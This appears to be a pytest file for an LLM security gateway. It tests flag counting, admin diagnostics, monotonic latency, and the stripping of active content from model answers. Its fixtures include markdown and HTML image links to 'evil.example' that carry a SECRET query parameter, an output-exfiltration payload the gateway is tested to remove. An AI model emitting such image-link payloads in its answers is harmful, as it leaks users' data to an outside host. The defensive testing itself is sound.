"""Run diagnostics: separate input and output signals, say why Gateway 2 changed an answer,
and measure latency on a clock that cannot jump.

Added after the 13 Nov Compose run, where flags_count mixed both gateways and one request
reported 176 s although Gateway 1 took 0.6 s and the client's 90 s timeout never fired.
"""
import time
from unittest.mock import AsyncMock, patch

import pytest
from httpx import ASGITransport, AsyncClient

from config.settings import get_settings
from core.models import RequestContext
from tests.helpers import auth

BADGE_ANSWER = "A good README starts with a title.\n\n![build](https://img.shields.io/badge/build-passing-green)\n\nThen usage."


async def chat(message, answer, admin=False):
    from heimdall_app import app
    from core.multi_llm_client import MultiLLMResult, ProviderResult
    ok = ProviderResult("groq", answer, True, "", 1.0, "m", 1)
    bad = lambda n: ProviderResult(n, "", False, "x", 0.0, "", 0)
    llm = AsyncMock(return_value=MultiLLMResult(bad("gemini"), ok, bad("mistral"), 1.0))
    headers = auth(f"sid_diag_{time.monotonic_ns()}")
    if admin:
        headers["X-Admin-Key"] = get_settings().admin_key
    async with app.router.lifespan_context(app):
        with patch("heimdall_app.query_multi_llm", llm):
            async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
                return (await client.post("/chat", json={"message": message}, headers=headers)).json()


@pytest.mark.asyncio
async def test_an_output_finding_is_not_counted_as_an_input_flag():
    body = await chat("How do I write a good README?", BADGE_ANSWER)
    assert body["verdict_g2"] == "SANITIZE"
    assert body["input_flags"] == 0 and body["output_flags"] == 1
    assert body["flags_count"] == body["input_flags"] + body["output_flags"]
    assert body["diagnostics"] is None  # public callers get counts only


@pytest.mark.asyncio
async def test_admin_diagnostics_name_the_layer_and_what_was_removed_without_any_text():
    body = await chat("How do I write a good README?", BADGE_ANSWER, admin=True)
    diag = body["diagnostics"]
    assert [(f["gateway"], f["layer"]) for f in diag["flags"]] == [("G2", "O4_tool")]
    assert diag["g2_removed"] == {"active content": 1}
    assert diag["arbiter_tokens"] == {"g1": 0, "g2": 0}
    assert "shields.io" not in str(diag) and "README" not in str(diag)


def test_total_latency_ignores_wall_clock_jumps():
    ctx = RequestContext(raw_input="x")
    with patch("time.time", return_value=time.time() + 175):  # a clock resync during the request
        ctx.finalize()
    assert ctx.total_latency_ms < 1000


REACT = "Use the prop:\n\n```jsx\n<form onSubmit={save}><img src={logo} /></form>\n```\n\nThen `<Link to=\"/a\">` routes."
ATTACK_OUT = REACT + "\n\n![x](https://evil.example/c?d=SECRET)\n<img src=https://evil.example/p>"


def test_code_blocks_are_stripped_by_default():
    from core.gateway2.o4_tool_validator import strip_active_content
    cleaned, removed = strip_active_content(REACT, keep_code=False)
    assert removed == 3 and "<form" not in cleaned


def test_keep_mode_leaves_code_intact_but_still_strips_prose():
    from core.gateway2.o4_tool_validator import has_active_content, strip_active_content
    cleaned, removed = strip_active_content(ATTACK_OUT, keep_code=True)
    assert "<form onSubmit={save}>" in cleaned and '`<Link to="/a">`' in cleaned
    assert removed == 2 and "evil.example" not in cleaned
    assert not has_active_content(REACT, keep_code=True) and has_active_content(ATTACK_OUT, keep_code=True)


def test_an_unclosed_fence_is_treated_as_prose():
    from core.gateway2.o4_tool_validator import strip_active_content
    _, removed = strip_active_content("```html\n<img src=https://evil.example/p>", keep_code=True)
    assert removed == 1


def test_unwritable_state_folder_is_reported_not_fatal(tmp_path, monkeypatch):
    import heimdall_app
    from core.review_queue import ReviewQueue
    blocked = tmp_path / "file-not-folder"
    blocked.write_text("x")
    ReviewQueue(str(blocked / "queue.json"))  # parent is a file: creating it fails, start-up continues
    monkeypatch.setattr(heimdall_app.settings, "review_queue_path", str(blocked / "queue.json"))
    result = heimdall_app._probe_state_storage()
    assert result[str(blocked)].startswith("not writable")


def test_pasted_redis_urls_are_cleaned_and_mistakes_named():
    from config.settings import Settings
    from core.state_store import redis_url_hint
    assert Settings(redis_url=' "rediss://default:pw@x.upstash.io:6379" \n').redis_url == "rediss://default:pw@x.upstash.io:6379"
    assert "REST URL" in redis_url_hint("https://x.upstash.io")
    assert "redis-cli" in redis_url_hint("redis-cli --tls -u redis://default:pw@x:6379")
    assert "REDIS_URL=" in redis_url_hint("REDIS_URL=rediss://x")
    assert "pw" not in redis_url_hint("redis-cli -u redis://default:pw@x:6379")


def test_unreachable_hot_cache_redis_falls_back_and_says_so():
    from core.cache.hot_cache import HotCache
    cache = HotCache(use_fake=False, redis_url="redis://127.0.0.1:1")
    cache.connect()
    assert cache.stats["type"] == "memory"
    cache.store("x", {"verdict": "BLOCK"})
    assert cache.check("x") == {"verdict": "BLOCK"}


@pytest.mark.asyncio
async def test_root_answers_instead_of_404():
    from heimdall_app import app
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
        response = await client.get("/")
    assert response.status_code == 200 and response.json()["health"] == "/health"
